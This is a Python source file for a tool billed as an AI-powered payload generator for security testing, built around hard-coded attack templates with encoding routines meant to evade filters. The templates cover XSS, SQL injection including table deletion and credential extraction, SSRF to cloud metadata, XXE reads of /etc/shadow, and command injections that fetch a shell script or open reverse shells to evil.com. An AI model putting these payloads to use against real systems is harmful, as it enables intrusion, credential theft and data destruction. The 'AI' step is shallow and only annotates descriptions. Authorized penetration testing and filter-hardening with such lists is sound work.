"""
Intelligent Payload Generator - AI-Powered Security Testing Payloads
Generates context-aware payloads for security testing
Uses machine learning to create sophisticated test cases
"""

import logging
import json
import random
import string
from typing import Dict, List, Any, Optional
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class Payload:
    """Security testing payload"""
    payload_type: str
    payload: str
    description: str
    severity: str
    target_param: str
    encoding: str
    obfuscation: str
    expected_behavior: str
    bypass_technique: str


class IntelligentPayloadGenerator:
    """AI-powered intelligent payload generator"""

    def __init__(self, use_ai: bool = True):
        """
        Initialize payload generator

        Args:
            use_ai: Enable AI for payload generation
        """
        self.use_ai = use_ai
        self.payload_templates = self._load_payload_templates()
        self.ai_analyzer = self._init_ai()
        self.payload_history = []

    def _init_ai(self):
        """Initialize AI analyzer"""
        try:
            from .ai_analyzer import AIAnalyzer
            return AIAnalyzer()
        except ImportError:
            logger.warning("AI analyzer not available")
            return None

    def _load_payload_templates(self) -> Dict[str, List[Dict]]:
        """Load payload templates"""
        return {
            'xss': [
                {
                    'template': '<script>alert({})</script>',
                    'description': 'Basic XSS alert',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': '<img src=x onerror=alert({})>',
                    'description': 'XSS via img onerror',
                    'severity': 'medium',
                    'bypass': 'script_tag_filter'
                },
                {
                    'template': '<svg onload=alert({})>',
                    'description': 'XSS via SVG',
                    'severity': 'medium',
                    'bypass': 'img_filter'
                },
                {
                    'template': 'javascript:alert({})',
                    'description': 'XSS via javascript protocol',
                    'severity': 'medium',
                    'bypass': 'html_filter'
                },
                {
                    'template': '<iframe src="javascript:alert({})"></iframe>',
                    'description': 'XSS via iframe',
                    'severity': 'high',
                    'bypass': 'basic_filter'
                },
                {
                    'template': '<body onload=alert({})>',
                    'description': 'XSS via body onload',
                    'severity': 'medium',
                    'bypass': 'event_filter'
                },
                {
                    'template': '<input onfocus=alert({}) autofocus>',
                    'description': 'XSS via input autofocus',
                    'severity': 'medium',
                    'bypass': 'event_filter'
                },
                {
                    'template': '<details open ontoggle=alert({})>',
                    'description': 'XSS via details toggle',
                    'severity': 'high',
                    'bypass': 'event_filter'
                },
                {
                    'template': '<marquee onstart=alert({})>',
                    'description': 'XSS via marquee',
                    'severity': 'medium',
                    'bypass': 'tag_filter'
                },
                {
                    'template': '" onmouseover=alert({}) x="',
                    'description': 'XSS via attribute injection',
                    'severity': 'high',
                    'bypass': 'quote_filter'
                }
            ],
            'sqli': [
                {
                    'template': "' OR '1'='1",
                    'description': 'Basic SQL injection',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': "' OR 1=1--",
                    'description': 'SQL injection with comment',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                },
                {
                    'template': '" OR "1"="1',
                    'description': 'SQL injection with double quotes',
                    'severity': 'critical',
                    'bypass': 'single_quote_filter'
                },
                {
                    'template': "' UNION SELECT NULL,NULL,NULL--",
                    'description': 'SQL injection with UNION',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                },
                {
                    'template': "1' ORDER BY 1--",
                    'description': 'SQL injection for column enumeration',
                    'severity': 'high',
                    'bypass': None
                },
                {
                    'template': "' AND 1=1--",
                    'description': 'SQL injection boolean-based',
                    'severity': 'high',
                    'bypass': None
                },
                {
                    'template': "' AND SLEEP(5)--",
                    'description': 'SQL injection time-based blind',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                },
                {
                    'template': "'; DROP TABLE users--",
                    'description': 'SQL injection for data deletion',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                },
                {
                    'template': "' OR (SELECT COUNT(*) FROM users) > 0--",
                    'description': 'SQL injection subquery',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                },
                {
                    'template': "' UNION SELECT username,password FROM users--",
                    'description': 'SQL injection data extraction',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                }
            ],
            'ssrf': [
                {
                    'template': 'http://127.0.0.1:80',
                    'description': 'SSRF to localhost',
                    'severity': 'high',
                    'bypass': None
                },
                {
                    'template': 'http://169.254.169.254/latest/meta-data/',
                    'description': 'SSRF to AWS metadata',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': 'http://localhost/admin',
                    'description': 'SSRF to internal admin',
                    'severity': 'high',
                    'bypass': 'localhost_filter'
                },
                {
                    'template': 'http://0177.0.0.1',
                    'description': 'SSRF with octal IP',
                    'severity': 'high',
                    'bypass': 'ip_filter'
                },
                {
                    'template': 'http://2130706433',
                    'description': 'SSRF with decimal IP',
                    'severity': 'high',
                    'bypass': 'ip_filter'
                },
                {
                    'template': 'http://[::1]',
                    'description': 'SSRF with IPv6 localhost',
                    'severity': 'high',
                    'bypass': 'ipv4_filter'
                },
                {
                    'template': 'http://192.168.1.1',
                    'description': 'SSRF to internal network',
                    'severity': 'high',
                    'bypass': 'external_filter'
                },
                {
                    'template': 'file:///etc/passwd',
                    'description': 'SSRF to local file',
                    'severity': 'critical',
                    'bypass': 'http_filter'
                },
                {
                    'template': 'http://metadata.google.internal/computeMetadata/v1/',
                    'description': 'SSRF to GCP metadata',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': 'dns://burpcollaborator.net',
                    'description': 'SSRF via DNS',
                    'severity': 'high',
                    'bypass': 'http_filter'
                }
            ],
            'rce': [
                {
                    'template': '; ls -la',
                    'description': 'Command injection - list files',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': '| cat /etc/passwd',
                    'description': 'Command injection - read file',
                    'severity': 'critical',
                    'bypass': 'semicolon_filter'
                },
                {
                    'template': '&& whoami',
                    'description': 'Command injection - whoami',
                    'severity': 'critical',
                    'bypass': 'pipe_filter'
                },
                {
                    'template': '`id`',
                    'description': 'Command injection - backticks',
                    'severity': 'critical',
                    'bypass': 'operator_filter'
                },
                {
                    'template': '$(cat /etc/passwd)',
                    'description': 'Command injection - dollar substitution',
                    'severity': 'critical',
                    'bypass': 'backtick_filter'
                },
                {
                    'template': '%0als -la',
                    'description': 'Command injection - URL encoded',
                    'severity': 'critical',
                    'bypass': 'special_char_filter'
                },
                {
                    'template': '; wget http://evil.com/shell.sh',
                    'description': 'Command injection - download shell',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': '| curl http://evil.com',
                    'description': 'Command injection - curl',
                    'severity': 'critical',
                    'bypass': 'semicolon_filter'
                },
                {
                    'template': '; nc -e /bin/sh evil.com 4444',
                    'description': 'Command injection - reverse shell',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': '&& bash -i >& /dev/tcp/evil.com/4444 0>&1',
                    'description': 'Command injection - bash reverse shell',
                    'severity': 'critical',
                    'bypass': 'pipe_filter'
                }
            ],
            'idor': [
                {
                    'template': '1',
                    'description': 'Basic IDOR - ID 1',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': '0',
                    'description': 'IDOR - ID 0',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': '-1',
                    'description': 'IDOR - negative ID',
                    'severity': 'medium',
                    'bypass': 'positive_filter'
                },
                {
                    'template': '999999',
                    'description': 'IDOR - large ID',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': "' OR 1=1--",
                    'description': 'IDOR - SQL injection',
                    'severity': 'high',
                    'bypass': None
                },
                {
                    'template': "../",
                    'description': 'IDOR - path traversal',
                    'severity': 'high',
                    'bypass': None
                },
                {
                    'template': "null",
                    'description': 'IDOR - null value',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': "true",
                    'description': 'IDOR - boolean true',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': "[]",
                    'description': 'IDOR - empty array',
                    'severity': 'medium',
                    'bypass': None
                },
                {
                    'template': "{}",
                    'description': 'IDOR - empty object',
                    'severity': 'medium',
                    'bypass': None
                }
            ],
            'xxe': [
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    'description': 'XXE - file read',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
                    'description': 'XXE - external entity',
                    'severity': 'critical',
                    'bypass': 'local_file_filter'
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
                    'description': 'XXE - PHP filter',
                    'severity': 'critical',
                    'bypass': 'file_filter'
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
                    'description': 'XXE - expect protocol',
                    'severity': 'critical',
                    'bypass': 'file_filter'
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo></foo>',
                    'description': 'XXE - parameter entity',
                    'severity': 'critical',
                    'bypass': 'basic_filter'
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
                    'description': 'XXE - hosts file',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                    'description': 'XXE - shadow file',
                    'severity': 'critical',
                    'bypass': None
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com:80/_GET%20HTTP/1.0%0AHost:evil.com%0A">]><foo>&xxe;</foo>',
                    'description': 'XXE - gopher protocol',
                    'severity': 'critical',
                    'bypass': 'http_filter'
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]><foo>&xxe;</foo>',
                    'description': 'XXE - data protocol',
                    'severity': 'high',
                    'bypass': 'http_filter'
                },
                {
                    'template': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/evil.txt">]><foo>&xxe;</foo>',
                    'description': 'XXE - jar protocol',
                    'severity': 'critical',
                    'bypass': 'http_filter'
                }
            ]
        }

    def generate_payloads(self, vuln_type: str, context: Dict[str, Any] = None,
                          count: int = 10, obfuscate: bool = True) -> List[Payload]:
        """
        Generate intelligent payloads for a vulnerability type

        Args:
            vuln_type: Type of vulnerability (xss, sqli, ssrf, rce, idor, xxe)
            context: Context information (target, parameter, etc.)
            count: Number of payloads to generate
            obfuscate: Apply obfuscation techniques

        Returns:
            List of generated payloads
        """
        logger.info(f"Generating {count} payloads for {vuln_type}")

        vuln_type = vuln_type.lower()
        templates = self.payload_templates.get(vuln_type, [])

        if not templates:
            logger.warning(f"No templates found for {vuln_type}")
            return []

        payloads = []

        for i in range(count):
            template = random.choice(templates)

            # Generate unique identifier
            unique_id = hashlib.md5(f"{vuln_type}{i}{datetime.now().isoformat()}".encode()).hexdigest()[:8]

            # Build payload
            payload_str = template['template'].format(unique_id)

            # Apply obfuscation
            if obfuscate:
                payload_str = self._obfuscate_payload(payload_str, vuln_type)

            # Create payload object
            payload = Payload(
                payload_type=vuln_type,
                payload=payload_str,
                description=template['description'],
                severity=template['severity'],
                target_param=context.get('param', 'unknown') if context else 'unknown',
                encoding='raw',
                obfuscation='basic' if obfuscate else 'none',
                expected_behavior=self._describe_expected_behavior(vuln_type),
                bypass_technique=template.get('bypass', 'none')
            )

            payloads.append(payload)

        # AI enhancement
        if self.use_ai and self.ai_analyzer:
            payloads = self._enhance_with_ai(payloads, context)

        # Track history
        self.payload_history.extend(payloads)

        return payloads

    def _obfuscate_payload(self, payload: str, vuln_type: str) -> str:
        """Apply obfuscation to payload"""
        obfuscation_methods = [
            self._obfuscate_hex_encode,
            self._obfuscate_url_encode,
            self._obfuscate_unicode,
            self._obfuscate_case_variation,
            self._obfuscate_comment_injection
        ]

        # Apply random obfuscation
        method = random.choice(obfuscation_methods)
        return method(payload, vuln_type)

    def _obfuscate_hex_encode(self, payload: str, vuln_type: str) -> str:
        """Hex encode payload"""
        try:
            return payload.encode('utf-8').hex()
        except:
            return payload

    def _obfuscate_url_encode(self, payload: str, vuln_type: str) -> str:
        """URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(payload)

    def _obfuscate_unicode(self, payload: str, vuln_type: str) -> str:
        """Unicode encode payload"""
        try:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        except:
            return payload

    def _obfuscate_case_variation(self, payload: str, vuln_type: str) -> str:
        """Random case variation"""
        result = []
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    def _obfuscate_comment_injection(self, payload: str, vuln_type: str) -> str:
        """Inject comments to break patterns"""
        if vuln_type == 'sqli':
            return payload.replace(' ', '/**/')
        elif vuln_type == 'xss':
            return payload.replace('<', '<!-- -->').replace('>', '<!-- -->')
        else:
            return payload

    def _describe_expected_behavior(self, vuln_type: str) -> str:
        """Describe expected behavior of payload"""
        behaviors = {
            'xss': 'JavaScript alert should execute in browser',
            'sqli': 'SQL query should be manipulated, returning different data',
            'ssrf': 'Server should make HTTP request to specified URL',
            'rce': 'System command should execute on server',
            'idor': 'Should access data belonging to different user',
            'xxe': 'XML parser should read external resource'
        }
        return behaviors.get(vuln_type, 'Unknown behavior')

    def _enhance_with_ai(self, payloads: List[Payload], context: Dict[str, Any]) -> List[Payload]:
        """Enhance payloads with AI analysis"""
        try:
            for payload in payloads:
                # Use AI to suggest improvements
                analysis = self.ai_analyzer.analyze(
                    tool_name='payload_generator',
                    task='enhance_payload',
                    content=f"{payload.payload_type}: {payload.payload}"
                )

                if analysis.get('analysis'):
                    payload.description += f" (AI: {analysis['analysis']})"

            return payloads
        except Exception as e:
            logger.warning(f"AI enhancement failed: {e}")
            return payloads

    def generate_fuzzing_dictionary(self, vuln_type: str) -> List[str]:
        """Generate fuzzing dictionary for vulnerability type"""
        payloads = self.generate_payloads(vuln_type, count=50, obfuscate=False)
        return [p.payload for p in payloads]

    def save_payloads(self, payloads: List[Payload], output_path: str):
        """Save payloads to file"""
        output_file = Path(output_path)
        output_file.parent.mkdir(parents=True, exist_ok=True)

        data = [
            {
                'type': p.payload_type,
                'payload': p.payload,
                'description': p.description,
                'severity': p.severity,
                'target_param': p.target_param,
                'encoding': p.encoding,
                'obfuscation': p.obfuscation,
                'expected_behavior': p.expected_behavior,
                'bypass_technique': p.bypass_technique
            }
            for p in payloads
        ]

        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)

        logger.info(f"Saved {len(payloads)} payloads to {output_path}")

    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get statistics on generated payloads"""
        stats = {
            'total_generated': len(self.payload_history),
            'by_type': {},
            'by_severity': {}
        }

        for payload in self.payload_history:
            # Count by type
            ptype = payload.payload_type
            stats['by_type'][ptype] = stats['by_type'].get(ptype, 0) + 1

            # Count by severity
            severity = payload.severity
            stats['by_severity'][severity] = stats['by_severity'].get(severity, 0) + 1

        return stats


def main():
    """Main entry point for testing"""
    generator = IntelligentPayloadGenerator()

    # Generate XSS payloads
    xss_payloads = generator.generate_payloads('xss', count=5)
    print(f"Generated {len(xss_payloads)} XSS payloads")

    for payload in xss_payloads:
        print(f"- {payload.payload}: {payload.description}")

    # Generate SQLi payloads
    sqli_payloads = generator.generate_payloads('sqli', count=5)
    print(f"\nGenerated {len(sqli_payloads)} SQLi payloads")

    for payload in sqli_payloads:
        print(f"- {payload.payload}: {payload.description}")


if __name__ == '__main__':
    main()
